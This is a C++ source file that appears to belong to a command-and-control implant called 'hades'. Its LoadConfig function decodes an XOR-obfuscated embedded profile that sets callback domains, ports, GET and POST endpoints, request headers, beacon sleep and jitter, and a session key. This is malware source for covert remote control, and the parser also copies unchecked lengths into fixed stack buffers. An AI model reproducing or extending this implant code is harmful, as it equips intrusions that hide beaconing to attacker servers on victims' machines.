#include "config.hpp"
#include "../utils/bytes.hpp"
#include "../hades/hades.h"
#include <stdio.h>






/*
	[Domain count] 4 bytes
	----
	looped for domain count
	[domain len] 4 bytes
	[domain string] N bytes
	[port] 4 bytes
	[isHttps] 4 bytes
	-----
	[Get Endpoint len] 4 bytes
	[Get Endpoint str] N bytes
	[post Endpoint len] 4 bytes
	[post Endpoint str] N bytes
	[Header len] 4 bytes
	[header string] N bytes
	[Sleep] 4 bytes
	[jitter] 4 bytes

	NOTE:
		header is a properly formatted Key: Value\r\nKey: Value\r\n\r\n\0
		this can be directly passed to WinHttp add headers


*/
BOOL LoadConfig() {

	hades->config = AllocMemory<Config>(sizeof(struct Config));
	UINT ProfileSize = GetProfileSize();
	PBYTE Temp = AllocMemory<BYTE>(ProfileSize);
	for (UINT i = 0; i < ProfileSize; i++) Temp[i] = GetProfile()[i];
	g_ByteMgr->InitRead(Temp, ProfileSize);


	UINT Key = g_ByteMgr->Read4();
	PBYTE kb = (PBYTE)&Key;
	for (UINT i = 4; i < ProfileSize; i++) {
		g_ByteMgr->InData[i] ^= kb[(i - 4) % 4];
	}

	hades->config->RegisterID = g_ByteMgr->Read4();
	hades->config->domaincounts = g_ByteMgr->Read4();
	for (int i = 0; i < hades->config->domaincounts; i++) {
		UINT len = g_ByteMgr->Read4();
		char buf[256];

		g_ByteMgr->ReadInto((PBYTE)buf, len);
		MultiByteToWideChar(CP_UTF8, 0, buf, -1, (LPWSTR)hades->config->domains[i].domain, len);
		hades->config->domains[i].port = g_ByteMgr->Read4();
		hades->config->domains[i].isHttps = g_ByteMgr->Read4();
	}

	char buf[256];
	UINT GetLen = g_ByteMgr->Read4();
	g_ByteMgr->ReadInto((PBYTE)buf, GetLen);
	MultiByteToWideChar(CP_UTF8, 0, buf, -1, (LPWSTR)hades->config->GetEndpoint, GetLen);


	UINT PostLen = g_ByteMgr->Read4();
	g_ByteMgr->ReadInto((PBYTE)buf, PostLen);
	MultiByteToWideChar(CP_UTF8, 0, buf, -1, (LPWSTR)hades->config->PostEndpoint, PostLen);


	UINT HeaderLen = g_ByteMgr->Read4();
	g_ByteMgr->ReadInto((PBYTE)buf, HeaderLen);
	MultiByteToWideChar(CP_UTF8, 0, buf, -1, (LPWSTR)hades->config->Headers, HeaderLen);

	hades->config->Sleep = g_ByteMgr->Read4();
	hades->config->Jitter = g_ByteMgr->Read4();
	hades->config->SessionKey = g_ByteMgr->Read4();


	HeapFree(GetProcessHeap(), 0, Temp);

	DEBUG_LOG_WIDE(L"Domain: %ls\nPort: %d\nIsHttps: %d\nGet: %ls\nPost: %ls\nUA: %ls\n",
		hades->config->domains[0].domain,
		hades->config->domains[0].port,
		hades->config->domains[0].isHttps,
		hades->config->GetEndpoint,
		hades->config->PostEndpoint,
		hades->config->Headers);

	return TRUE;

}

//Config* conf = NULL;